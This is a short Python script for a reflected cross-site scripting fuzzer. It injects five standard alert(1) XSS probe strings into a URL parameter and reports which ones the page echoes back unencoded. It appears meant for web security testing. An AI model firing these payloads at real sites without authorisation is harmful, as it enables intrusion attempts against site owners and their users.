import sys
import argparse
import urllib.parse

try:
    import aiohttp
    import asyncio
    ASYNC = True
except ImportError:
    import requests
    ASYNC = False
    print("Warning: aiohttp not found. Falling back to synchronous (slower but lighter).")

payloads = [  # add more from PayloadAllThings repo
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\" onclick=\"alert(1)\"",
    "<svg onload=alert(1)>",
]

def validate_url(url):
    """Security: Basic URL validation to prevent injection"""
    parsed = urllib.parse.urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        raise ValueError("Invalid URL")
    return url

async def test_payload(session, base_url, param, payload):
    """Async test  efficient for multiple payloads"""
    try:
        encoded = urllib.parse.quote(payload)
        url = base_url.replace(f"{{{param}}}", encoded)  # e.g., url?query={param}
        async with session.get(url) as resp:
            text = await resp.text()
            if payload in text:  # Simple reflection check; refine for real use
                return f"Potential XSS: {payload} reflected in {url}"
    except Exception as e:
        return f"Error with {payload}: {str(e)}"
    return None

def sync_test(base_url, param, payload):
    """Fallback sync"""
    try:
        encoded = urllib.parse.quote(payload)
        url = base_url.replace(f"{{{param}}}", encoded)
        resp = requests.get(url)
        if payload in resp.text:
            return f"Potential XSS: {payload} reflected in {url}"
    except Exception as e:
        return f"Error with {payload}: {str(e)}"
    return None

async def main_async(args):
    url = validate_url(args.url)
    async with aiohttp.ClientSession() as session:
        tasks = [test_payload(session, url, args.param, p) for p in payloads]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res:
                print(res)

def main_sync(args):
    url = validate_url(args.url)
    for p in payloads:
        res = sync_test(url, args.param, p)
        if res:
            print(res)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Light XSS Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL with {param} placeholder, e.g., http://example.com/search?q={query}")
    parser.add_argument("-p", "--param", required=True, help="Parameter name, e.g., query")
    args = parser.parse_args()

    if ASYNC:
        asyncio.run(main_async(args))
    else:
        main_sync(args)


